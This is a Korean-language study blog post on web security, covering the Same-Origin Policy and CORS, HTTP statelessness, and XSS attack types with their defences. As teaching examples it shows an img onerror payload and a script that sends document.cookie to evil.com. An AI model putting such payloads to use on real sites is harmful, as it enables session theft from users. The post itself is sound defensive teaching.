---
layout: post
title: "HTTP & 웹 보안: SOP, Stateless/Connectionless, XSS 완전 가이드"
date: 2024-07-25 14:30:00 +0900
categories: [CS, Network]
tags: [HTTP, 웹보안, SOP, Stateless, Connectionless, XSS, CORS, 네트워크]
---

# HTTP & 웹 보안: SOP, Stateless/Connectionless, XSS 완전 가이드

## 🎯 학습 목표 및 전체 구조

### **핵심 주제**
- **15번: SOP 정책**
- **16번: Stateless와 Connectionless** 
- **21번: XSS**

### **주제 간 연관성**
```
웹 보안의 3단계 방어체계
├── 1단계: SOP (브라우저 레벨 보안)
├── 2단계: HTTP 특성 (프로토콜 레벨 특성)
└── 3단계: XSS 방어 (애플리케이션 레벨 보안)
```

---

## 1️⃣ SOP (Same-Origin Policy) 정책

### 🤔 왜 필요할까요?

여러분이 은행 웹사이트(bank.com)에 로그인했다고 생각해보세요. 동시에 다른 탭에서 악성 웹사이트(evil.com)를 방문했습니다. 만약 보안 정책이 없다면 악성 사이트가 은행 사이트의 계좌 정보를 몰래 읽거나 돈을 이체할 수 있습니다.

### 📋 SOP의 정의

**SOP(Same-Origin Policy)**는 브라우저의 보안 정책으로, **같은 출처(Origin)의 리소스만 접근**할 수 있도록 제한합니다.

### 🎯 Origin(출처) 구성

Origin은 다음 **세 가지 요소**로 구성됩니다:

```
Protocol + Domain + Port = Origin
```

**예시:**
- `https://bank.com:443/account` → Origin: `https://bank.com:443`
- `http://shop.com:80/products` → Origin: `http://shop.com:80`

### ✅ SOP 적용 예시

| 원본 사이트 | 접근하려는 사이트 | 허용 여부 | 이유 |
|------------|------------------|----------|------|
| https://bank.com | https://bank.com/user | ✅ 허용 | 완전히 동일한 Origin |
| https://bank.com | http://bank.com | ❌ 차단 | Protocol 다름 (https ≠ http) |
| https://bank.com | https://evil.com | ❌ 차단 | Domain 다름 |
| https://bank.com:443 | https://bank.com:8080 | ❌ 차단 | Port 다름 |

### 🔧 SOP 우회 방법들

정당한 이유로 다른 Origin의 리소스에 접근해야 할 때 사용하는 방법들:

**1. CORS (Cross-Origin Resource Sharing)**
```javascript
// 서버에서 허용 헤더 설정
Access-Control-Allow-Origin: https://trusted-site.com
```

**2. JSONP (JSON with Padding)**
```html
<script src="https://api.other-site.com/data?callback=handleData"></script>
```

---

## 2️⃣ Stateless와 Connectionless

### 🤔 HTTP의 기본 특성

HTTP는 **간단하고 효율적**으로 설계된 프로토콜입니다. 이를 위해 두 가지 중요한 특성을 가집니다.

### 📋 Stateless (무상태)의 정의

**Stateless**란 서버가 **이전 요청의 상태나 정보를 기억하지 않는다**는 의미입니다.

**일상 예시:**
```
🏪 편의점 알바생 (Stateless 서버)
고객A: "콜라 주세요" → 알바생: "네, 1500원입니다"
고객A: "과자도 주세요" → 알바생: "누구세요? 뭘 사셨죠?"
```

### 📋 Connectionless (비연결성)의 정의

**Connectionless**란 **요청과 응답이 끝나면 연결을 끊는다**는 의미입니다.

**비교:**
```
📞 전화통화 (Connection 유지)
"여보세요?" → 대화 → 대화 → "안녕히 계세요" → 끊음

🌐 HTTP (Connectionless)
"메인 페이지 주세요" → "여기 있어요" → 뚝! (연결 끊음)
"로그인 페이지 주세요" → "여기 있어요" → 뚝! (연결 끊음)
```

### 💡 장단점

**장점:**
- **서버 자원 절약**: 수많은 클라이언트의 상태를 기억할 필요 없음
- **확장성**: 서버를 여러 대로 늘리기 쉬움
- **단순성**: 구현이 간단함

**단점:**
- **사용자 경험**: 로그인 상태를 유지하기 어려움
- **효율성**: 매번 새로 연결해야 함

### 🔧 해결 방법들

**1. 쿠키와 세션으로 상태 유지**
```
클라이언트 → 로그인 요청 → 서버
클라이언트 ← 쿠키 발급 ← 서버
클라이언트 → 쿠키와 함께 요청 → 서버 (상태 유지!)
```

**2. Keep-Alive로 연결 재사용**
```
HTTP/1.1에서 도입
Connection: keep-alive  // 연결을 잠시 유지
```

---

## 3️⃣ XSS (Cross-Site Scripting)

### 🤔 XSS란 무엇일까요?

**XSS**는 악성 스크립트를 다른 사용자의 브라우저에서 실행시키는 공격입니다.

**예시:**
```
🏪 게시판 사이트
악성 사용자: 게시글에 "안녕하세요 <script>나쁜코드</script>"를 작성
일반 사용자: 게시글을 보는 순간 → 나쁜코드가 실행됨!
```

### 📋 XSS의 세 가지 유형

**1. Stored XSS (저장형)**
- 데이터베이스에 악성 스크립트가 저장됨
- 게시글, 댓글 등을 통해 영구적으로 공격

**2. Reflected XSS (반사형)**
- URL 파라미터를 통한 일회성 공격
- 피해자가 특정 링크를 클릭할 때 공격 실행

**3. DOM-based XSS**
- JavaScript로 DOM을 조작할 때 발생
- 클라이언트 측에서만 발생하는 공격

### 🛡️ XSS 방어 방법

**1. 입력값 검증 및 이스케이프**
```javascript
// 위험한 코드
element.innerHTML = userInput;

// 안전한 코드
function escapeHtml(text) {
  return text
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');
}
element.textContent = escapeHtml(userInput);
```

**2. CSP (Content Security Policy)**
```html
<meta http-equiv="Content-Security-Policy" 
      content="script-src 'self'; object-src 'none';">
```

**3. HttpOnly 쿠키**
```
Set-Cookie: sessionId=abc123; HttpOnly; Secure
```

---

## 🔗 세 개념의 연관성

이 세 개념들은 **웹 보안의 서로 다른 층**을 담당합니다:

```
🌐 브라우저 보안 계층
├── SOP: 브라우저가 다른 사이트 접근 차단
├── HTTP 특성: 서버의 무상태/비연결 특성으로 보안 복잡성 증가
└── XSS: 애플리케이션 레벨에서 스크립트 공격 방어
```

**실제 웹사이트에서의 적용:**
1. **SOP**가 기본 방어선 역할
2. **Stateless** 특성 때문에 세션 관리가 복잡해짐
3. **XSS** 공격은 이런 복잡성을 악용

---

## 📝 실무 적용 예제 4가지

### 예제 1: 온라인 쇼핑몰 시나리오

**상황**: 사용자가 `https://shop.com`에서 로그인 후 장바구니 이용

**🔒 SOP 적용:**
```javascript
// shop.com의 JavaScript
fetch('https://bank.com/api/account')  // ❌ CORS 에러!
fetch('https://shop.com/api/cart')     // ✅ 같은 Origin이라 허용
```

**🔄 Stateless 특성:**
```
1차: 로그인 → 서버: "쿠키 드림"
2차: 장바구니 요청 + 쿠키 → 서버: "쿠키 확인 후 응답"
3차: 상품 추가 + 쿠키 → 서버: "다시 쿠키 확인 후 처리"
```

**⚡ XSS 위험:**
상품 리뷰에 악성 스크립트 삽입으로 다른 사용자의 쿠키 탈취 시도

### 예제 2: 소셜 미디어 댓글 시스템

**상황**: `https://social.com`에서 사용자들이 댓글 작성

**🔒 SOP 보호:**
다른 사이트의 사용자 정보나 쿠키에 접근할 수 없음

**🔄 Connectionless:**
각 댓글 작성, 목록 조회마다 새로운 연결 생성 및 해제

**⚡ Stored XSS:**
```html
악성 댓글: "안녕하세요! <img src='x' onerror='alert(\"XSS!\")' />"
→ 다른 사용자가 페이지 로드시 스크립트 실행
```

### 예제 3: 온라인 뱅킹 시스템

**상황**: `https://mybank.com`에서 계좌 이체 진행

**🔒 SOP의 중요성:**
```html
<!-- 악성 사이트에서 시도 -->
<iframe src="https://mybank.com/transfer"></iframe>
<script>
  // ❌ SOP에 의해 차단됨
  iframe.contentDocument.forms[0].submit();
</script>
```

**🔄 Stateless 보안:**
매 거래마다 토큰 검증으로 보안 강화

**⚡ XSS 위험성:**
만약 XSS가 성공하면 사용자 모르게 이체 요청 가능

### 예제 4: 회사 인트라넷 시스템

**상황**: `https://company.com`에서 여러 내부 시스템 연동

**🔒 SOP 우회:**
서브도메인 간 통신을 위한 CORS 설정 필요

**🔄 마이크로서비스:**
각 서비스가 Stateless로 JWT 토큰으로 사용자 식별

**⚡ 내부 XSS:**
직원이 작성한 공지사항을 통한 내부 정보 유출 위험

---

## 🔥 핵심 질문 5가지

### 질문 1: CORS 에러 해결하기

**📋 문제상황**: 
프론트엔드에서 `https://myapp.com`에서 `https://api.backend.com`의 데이터를 가져오려는데 CORS 에러 발생

**✅ 해결방법**:

**원인**: **SOP** 때문에 브라우저가 다른 Origin 접근 차단

**해결책**:
```javascript
// 1. 백엔드에서 CORS 헤더 설정
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', 'https://myapp.com');
  res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE');
  next();
});

// 2. 프론트엔드에서 credentials 포함
fetch('https://api.backend.com/data', {
  credentials: 'include',
  headers: { 'Content-Type': 'application/json' }
});
```

### 질문 2: 로그인 상태 유지 메커니즘

**📋 문제상황**: 
HTTP는 Stateless인데 어떻게 로그인 상태를 유지하는가?

**✅ 해결방법**:

**문제**: 서버가 이전 요청을 기억하지 않음

**해결책**:
```javascript
// 방법 1: 세션 기반
// 로그인시: Set-Cookie: sessionId=abc123; HttpOnly
// 이후 요청: Cookie: sessionId=abc123

// 방법 2: JWT 토큰
// 로그인시: {token: "eyJhbGci..."}
// 이후 요청: Authorization: Bearer eyJhbGci...
```

### 질문 3: XSS 공격 시나리오와 방어

**📋 문제상황**: 
게시판에서 XSS 공격이 가능한 상황과 방어법

**✅ 해결방법**:

**공격 예시**:
```html
악성 댓글: "좋은 글이네요! <script>
  fetch('https://evil.com/steal?data=' + document.cookie);
</script>"
```

**방어 방법**:
```javascript
// 1. 입력값 이스케이프
function escapeHtml(text) {
  return text.replace(/</g, '&lt;').replace(/>/g, '&gt;');
}

// 2. CSP 설정
Content-Security-Policy: script-src 'self'

// 3. HttpOnly 쿠키
Set-Cookie: sessionId=abc123; HttpOnly; Secure
```

### 질문 4: API 요청 성능 최적화

**📋 문제상황**: 
Connectionless 특성으로 인한 성능 저하 해결

**✅ 해결방법**:

**문제**: 매번 새 연결로 인한 지연시간 증가

**최적화 방법**:
```javascript
// 1. Keep-Alive 활용
Connection: keep-alive

// 2. 요청 배치 처리
Promise.all([
  fetch('/api/user'),
  fetch('/api/posts'),
  fetch('/api/comments')
]);

// 3. 캐싱 전략
Cache-Control: public, max-age=3600
```

### 질문 5: 통합 브라우저 보안 설계

**📋 문제상황**: 
SOP만으로는 완벽한 보안이 불가능한 이유와 추가 보안 방법

**✅ 해결방법**:

**SOP의 한계**: 클릭재킹, XSS 우회, 피싱 사이트

**추가 보안 메커니즘**:
```javascript
// 1. CSP로 스크립트 제한
Content-Security-Policy: script-src 'self'

// 2. 클릭재킹 방지
X-Frame-Options: SAMEORIGIN

// 3. CSRF 방지
Set-Cookie: sessionId=abc123; SameSite=Strict

// 4. HTTPS 강제
Strict-Transport-Security: max-age=31536000
```

---

## 📋 핵심 키워드 정리

### **SOP 관련**
- **Same-Origin Policy**
- **Origin (Protocol + Domain + Port)**  
- **CORS**
- **JSONP**

### **HTTP 특성 관련**  
- **Stateless (무상태성)**
- **Connectionless (비연결성)**
- **Keep-Alive**
- **세션 관리**
- **쿠키**

### **XSS 관련**
- **Cross-Site Scripting**
- **Stored XSS**
- **Reflected XSS** 
- **DOM-based XSS**
- **CSP (Content Security Policy)**
- **입력값 검증**
- **HttpOnly**

---

## 🎓 학습 성과 확인

### **핵심 이해사항**
1. **SOP**는 브라우저 레벨에서 Origin 기반 접근 제어
2. **HTTP 특성**은 프로토콜 레벨에서 무상태/비연결로 단순성 확보
3. **XSS 방어**는 애플리케이션 레벨에서 스크립트 공격 차단
4. 세 개념이 **다층 방어체계**를 구성하여 웹 보안 실현

### **실무 적용 능력**
- CORS 에러 해결 및 설정
- 안전한 세션 관리 구현  
- XSS 공격 예방 코드 작성
- 통합 보안 전략 수립
